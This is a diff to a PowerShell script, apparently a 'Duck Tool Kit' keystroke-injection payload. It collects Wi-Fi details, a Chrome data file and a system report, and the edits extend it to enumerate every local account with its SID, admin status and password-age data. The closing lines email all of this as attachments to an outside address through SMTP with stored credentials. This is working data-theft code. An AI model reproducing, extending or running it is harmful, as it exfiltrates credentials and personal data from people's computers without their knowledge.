@@ -75,9 +75,9 @@ function Grab-Wifi-Details {
 }
 Grab-Wifi-Details
 
-function Get-Name {
+function Get-Name($userName) {
     try {
-		$fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")
+		$fullName = Net User $userName | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")
     }
  
     # Write Error is just for troubleshooting 
@@ -89,7 +89,6 @@ function Get-Name {
 
     return $fullName
 }
-$fullName = Get-Name
 
 
 <# Create the report #>
@@ -154,12 +153,28 @@ function Get-Public-IP {
     return $computerPubIP
 }
 
+function Add-User-Details([ref]$body, $userName) {
+	$UserInfo = Get-WmiObject -class Win32_UserAccount -namespace root/CIMV2 | Where-Object {$_.Name -eq $userName}| Select AccountType,SID,PasswordRequired  
+
+	$fullName = Get-Name $userName
+	$UserType = $UserInfo.AccountType 
+	$UserSid = $UserInfo.SID
+	$UserPassRequired = $UserInfo.PasswordRequired 
+	
+	$passwordLastSet = Get-Days-Since-Password-Last-Set $userName
+	if (-not $passwordLastSet) { $passwordLastSet = "Unknown" }
+	
+	$IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator') 
+	
+	$body.Value = $body.Value + "<br><table><tr><td>User Name:</td><td>$userName</td></tr><tr><td>Full Name:</td><td>$fullName</td></tr><tr><td>Account Type:</td><td> $UserType</td></tr><tr><td>User SID:</td><td>$UserSid</td></tr><tr><td>Account Domain:</td><td>$env:USERDOMAIN</td></tr><tr><td>Password Required:</td><td>$UserPassRequired</td></tr><tr><td>Password last set:</td><td>$passwordLastSet</td></tr><tr><td>Current User is Admin:</td><td>$IsAdmin</td></tr></table>" 
+}
+
 function Create-Report {
 	$date = get-date 
 	$style = "<style> table td{padding-right: 10px;text-align: left;}#body {padding:50px;font-family: Helvetica; font-size: 12pt; border: 10px solid black;background-color:white;height:100%;overflow:auto;}#left{float:left; background-color:#C0C0C0;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#right{background-color:#C0C0C0;float:right;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#center{background-color:#C0C0C0;width:98%;height:300px;border: 4px solid black;padding:10px;overflow:scroll;margin:10px;} </style>"
 	$body = $body + "<div id=body><h1>Duck Tool Kit Report</h1><hr size=2><br><h3> Generated on: $Date </h3><br>" 
 	$SysBootTime = Get-WmiObject Win32_OperatingSystem  
-	$BootTime = $SysBootTime.ConvertToDateTime($SysBootTime.LastBootUpTime)| ConvertTo-Html datetime  
+	$BootTime = $SysBootTime.ConvertToDateTime($SysBootTime.LastBootUpTime)
 	$SysSerialNo = (Get-WmiObject -Class Win32_OperatingSystem -ComputerName $env:COMPUTERNAME)
 	$SerialNo = $SysSerialNo.SerialNumber  
 	$SysInfo = Get-WmiObject -class Win32_ComputerSystem -namespace root/CIMV2 | Select Manufacturer,Model  
@@ -188,18 +203,16 @@ function Create-Report {
 	
 	$body = $body  + "<div id=left><h3>Computer Information</h3><br><table><tr><td>Operating System</td><td>$OS</td></tr><tr><td>OS Serial Number:</td><td>$SerialNo</td></tr><tr><td>Current User:</td><td>$env:USERNAME </td></tr><tr><td>System Uptime:</td><td>$BootTime</td></tr><tr><td>System Manufacturer:</td><td>$SysManufacturer</td></tr><tr><td>System Model:</td><td>$SysModel</td></tr><tr><td>Serial Number:</td><td>$HardSerialNo</td></tr><tr><td>Firewall is Active:</td><td>$FireProfile</td></tr></table></div><div id=right><h3>Hardware Information</h3><table><tr><td>Hardrive Size:</td><td>$HD GB</td></tr><tr><td>Hardrive Free Space:</td><td>$FreeSpace GB</td></tr><tr><td>System RAM:</td><td>$Ram GB</td></tr><tr><td>Processor:</td><td>$Cpu</td></tr><td>CD Drive:</td><td>$Disk</td></tr><tr><td>Graphics Card:</td><td>$graphics</td></tr></table></div>"  
 	
-	# Add user information
-	$UserInfo = Get-WmiObject -class Win32_UserAccount -namespace root/CIMV2 | Where-Object {$_.Name -eq $env:UserName}| Select AccountType,SID,PasswordRequired  
-	$UserType = $UserInfo.AccountType 
-	$UserSid = $UserInfo.SID
-	$UserPassRequired = $UserInfo.PasswordRequired 
+	# Add user information for all current users on the PC
+	$body = $body + "<div id=left><h3>PC Users</h3>" 
 	
-	$passwordLastSet = Get-Days-Since-Password-Last-Set
-	if (-not $passwordLastSet) { $passwordLastSet = "Unknown" }
+	$names = Get-LocalUser | Select Name
+	foreach ($currentName in $names) 
+	{
+		Add-User-Details ([ref]$body) $currentName.name
+		$body = $body + '<br>' 
+	}	
 	
-	$IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator') 
-	
-	$body =  $body + "<div id=left><h3>User Information</h3><br><table><tr><td>Current User Name:</td><td>$env:USERNAME</td></tr><tr><td>Full Name:</td><td>$fullName</td></tr><tr><td>Account Type:</td><td> $UserType</td></tr><tr><td>User SID:</td><td>$UserSid</td></tr><tr><td>Account Domain:</td><td>$env:USERDOMAIN</td></tr><tr><td>Password Required:</td><td>$UserPassRequired</td></tr><tr><td>Password last set:</td><td>$passwordLastSet</td></tr><tr><td>Current User is Admin:</td><td>$IsAdmin</td></tr></table>" 
 	$body = $body + '</div>' 
 
 	# Add network information
@@ -222,6 +235,7 @@ Create-Report
 # Send the email with attachements
 $sstr = ConvertTo-SecureString -string $emailSmtpPass -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential -argumentlist $emailSmtpUser, $sstr
+$fullName = Get-Name $env:UserName
 $subject = "$fullName ($env:UserName)"
 
 Send-MailMessage -From $emailSmtpUser -To $emailTo -Subject $subject -Body "Data test" -Attachments $chromeDataFilePath, $wifiFilePath, $reportFilePath -SmtpServer $SMTPServer -UseSSL -Credential $cred -Port 587
